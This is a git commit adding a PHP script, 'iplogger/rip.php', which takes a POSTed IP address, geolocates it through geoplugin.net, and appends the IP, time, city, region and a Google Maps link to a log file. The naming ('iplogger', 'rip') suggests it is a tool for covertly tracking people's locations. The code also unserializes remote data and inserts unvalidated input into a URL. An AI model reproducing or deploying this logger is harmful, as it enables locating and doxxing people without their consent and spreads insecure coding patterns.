a2be69369c10c20a97a79155da9c4d0aabd03ccc
Trihash <35306347+Trihash@users.noreply.github.com>
2018-04-14 01:40:16 +0200

    Add files via upload

---
+++ iplogger/rip.php
@@ -0,0 +1,19 @@
+<?php
+
+date_default_timezone_set('Europe/Paris');
+$geoplugin = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_POST['ip']));
+$f = "singe.log";
+$fo = fopen($f, "a+");
+$ti = "##########################";
+$position = "https://www.google.com/maps?q=".$geoplugin['geoplugin_latitude'].",".$geoplugin['geoplugin_longitude'];
+$date = date("d.m.Y, H:i:s");
+$ip = $_POST['ip'];
+$crc = "Country : ".$geoplugin['geoplugin_countryCode']."\nRegion : ".$geoplugin['geoplugin_region']."\nCity : ".$geoplugin['geoplugin_city'];
+$lmao = $ti."\nDate : ".$date."\nIP : ".$ip."\nPosition : ".$position."\n".$crc."\n".$ti."\n\n";
+
+if($fo) {
+fwrite($fo, $lmao);
+fclose($fo);
+}
+
+?>
